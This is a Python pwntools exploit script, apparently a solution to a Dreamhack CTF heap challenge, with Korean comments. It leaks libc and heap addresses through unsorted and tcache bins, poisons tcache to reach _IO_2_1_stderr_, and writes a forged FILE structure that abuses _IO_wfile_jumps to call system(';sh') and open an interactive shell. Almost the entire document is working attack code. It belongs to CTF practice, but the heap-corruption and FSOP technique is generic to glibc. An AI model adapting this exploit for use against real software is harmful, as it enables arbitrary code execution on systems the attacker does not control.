#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./prob')
#context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
HOST, PORT = "host3.dreamhack.games 11454".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')#ELF('/usr/lib/x86_64-linux-gnu/libc.so')

def create(idx, t, v=None, l=None): # v = value, l = len
    sla(b'cmd > ', b'1')
    sla(b'idx > ', str(idx).encode())
    sla(b'type > ', str(t).encode())

    if t == 11:
        sla(b'len > ', str(l).encode())
        sa(b'value > ', v if isinstance(v, bytes) else v.encode())
    else:
        sla(b'value > ', str(v).encode())

def show(idx):
    sla(b'cmd > ', b'2')
    sla(b'idx > ', str(idx).encode())

def add(idx1, idx2):
    sla(b'cmd > ', b'3')
    sla(b'idx1 > ', str(idx1).encode())
    sla(b'idx2 > ', str(idx2).encode())

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

# 적당히 큰 청크 2개
create(0, 11, b'A'*0x15000, 0x15000)
create(1, 11, b'B'*0x1000, 0x1000)

add(0, 1) # 이걸로 unsorted bin에 보내기
# 빈 거 하나 올리고
# 가장 작은 청크 아래 올리고
# 아래에 unsorted bin 있으니까 null 종결까지 쭉 읽기
create(2, 11, b'', 0)
show(2)

libc.address = uu64(r(6)) - 0x21a460 # main_arena offset
slog("libc_base", libc.address)
system = libc.sym["system"]
slog("system", system)
iowfile = libc.sym["_IO_wfile_jumps"]
slog("IO_wfile_jumps", iowfile)
stderr = libc.sym["_IO_2_1_stderr_"]
slog("stderr", stderr)

# tcache로 하나 보낼 거
create(3, 11, b'A'*0x10, 0x10) # 0x20, 또 작은 거 올린 뒤
add(3, 0) # 크게 만들어서 넣기
# -> tcache bin으로 보낼거, 큰 친구는 largebin으로 감
'''

'''

create(4, 11, b'', 0)
show(4)

heap = (u64(rl().strip().ljust(8, b'\x00')) << 12)
slog("heap_base", heap)
# 5, 6, 7
create(5, 11, b'A'*0x10, 0x10)
for i in range(6, 8):
    create(i, 11, b'A'*0x100, 0x100)
# tcache: 5, 6, 7
for i in range(7, 4, -1):
    add(i, 0)
fake_fsop = libc.sym["_IO_2_1_stderr_"]

pay = FSOP_struct(
    flags = u64(b"\x01\x01\x01\x01;sh\x00"),
    lock = fake_fsop + 0x1000,
    _wide_data = fake_fsop-0x10,
    _markers = system,
    _unused2 = p32(0) + p64(0) + p64(fake_fsop - 0x8),
    vtable = iowfile - 0x40,
    _mode = 0xffffffff
)
print(hex(len(pay)))

create(8, 11, b'A'*0x18 + p64(0x111) + p64((stderr) ^ (heap >> 12)) + b'\n', -1)
create(9, 11, b'B'*0x100, 0x100) # 빼고 stderrㅇ 꺼낼 준비
create(10, 11, pay.ljust(0x100, b'\x00') + b'\n', 0x100)

#gdb.attach(p);pause()

sl(b'0')

p.interactive()
